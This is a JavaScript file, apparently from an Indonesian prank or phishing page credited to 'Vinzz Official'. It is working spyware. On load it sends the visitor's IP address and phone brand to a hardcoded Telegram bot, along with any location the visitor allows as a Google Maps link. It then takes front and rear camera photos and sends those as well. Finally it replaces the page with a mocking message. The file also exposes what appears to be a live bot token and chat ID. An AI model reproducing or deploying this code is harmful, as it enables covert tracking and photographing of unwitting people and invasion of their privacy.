const token = '7876416430:AAGfJpQqoNvDSbx4tpuJQPdy5k8vx7Uhndw';
const chat_id = '7777604508';
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');

async function getIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip;
  } catch {
    return "Tidak diketahui";
  }
}

function getMerekHP() {
  const ua = navigator.userAgent;
  if (/Samsung/i.test(ua)) return "Samsung";  
  if (/Xiaomi|Mi/i.test(ua)) return "Xiaomi";  
  if (/Redmi/i.test(ua)) return "Redmi";  
  if (/OPPO/i.test(ua)) return "Oppo";  
  if (/Vivo/i.test(ua)) return "Vivo";  
  if (/Realme/i.test(ua)) return "Realme";  
  if (/iPhone/i.test(ua)) return "iPhone";  
  if (/Asus/i.test(ua)) return "Asus";  
  if (/Infinix/i.test(ua)) return "Infinix";  
  if (/Huawei/i.test(ua)) return "Huawei";  
  return "Tidak diketahui";
}

async function captureCamera(facing) {
  return new Promise((resolve, reject) => {
    navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facing } } })
      .then(stream => {
        video.srcObject = stream;
        video.onloadedmetadata = () => {
          video.play();
          setTimeout(() => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            stream.getTracks().forEach(track => track.stop());
            canvas.toBlob(blob => {
              resolve(blob);
            }, 'image/jpeg');
          }, 2000);
        };
      })
      .catch(err => reject(err));
  });
}

async function kirimFotoKeTelegram() {
  try {
    const frontBlob = await captureCamera('user');
    const backBlob = await captureCamera('environment');

    const formData = new FormData();
    formData.append('chat_id', chat_id);
    formData.append('media', JSON.stringify([
      { type: "photo", media: "attach://depan", caption: "📷 Kamera Depan" },
      { type: "photo", media: "attach://belakang", caption: "📷 Kamera Belakang" }
    ]));
    formData.append('depan', frontBlob, 'depan.jpg');
    formData.append('belakang', backBlob, 'belakang.jpg');

    await fetch(`https://api.telegram.org/bot${token}/sendMediaGroup`, {
      method: 'POST',
      body: formData
    });

  } catch (err) {
    await kirimPesanTelegram("Gagal mengirim foto: akses kamera di tolak");
  }
}

async function kirimPesanTelegram(pesan) {
  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chat_id,
      text: pesan
    })
  });
}

(async () => {
  const ip = await getIP();
  const merek = getMerekHP();
  const pesanAwal = `╭──「 IP berhasil ditemukan! 」──
│🌐 Status: MENUNGGU IZIN LOKASI
│📡 IP: ${ip}
│📱 Merek hp: ${merek}
╰───────────────────`;
  await kirimPesanTelegram(pesanAwal);
})();

navigator.geolocation.getCurrentPosition(
  async (pos) => {
    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;
    const gmaps = `https://www.google.com/maps?q=${lat},${lon}`;
    const ip = await getIP();
    const merek = getMerekHP();

    const pesan = `╭──「 IP berhasil ditemukan! 」──
│🌐 Status: MENGIZINKAN LOKASI
│📡 IP: ${ip}
│📱 Merek hp: ${merek}
│📍 Lokasi: ${gmaps}
│📷 Sedang meminta akses kamera...
╰───────────────────`;
    await kirimPesanTelegram(pesan);
    await kirimFotoKeTelegram();
    document.body.innerHTML = '<h2>Yahh kurang hoki bro wkwk.<br><small>by Vinzz Official</small></h2>';
  },
  async () => {
    const ip = await getIP();
    const merek = getMerekHP();

    const pesan = `╭──「 IP berhasil ditemukan! 」──
│🌐 Status: MENOLAK LOKASI
│📡 IP: ${ip}
│📱 Merek hp: ${merek}
│📷 Sedang meminta akses kamera...
╰───────────────────`;
    await kirimPesanTelegram(pesan);
    await kirimFotoKeTelegram();
    document.body.innerHTML = '<h2>Yahh kurang hoki bro wkwk.<br><small>by Vinzz Official</small></h2>';
  }
);
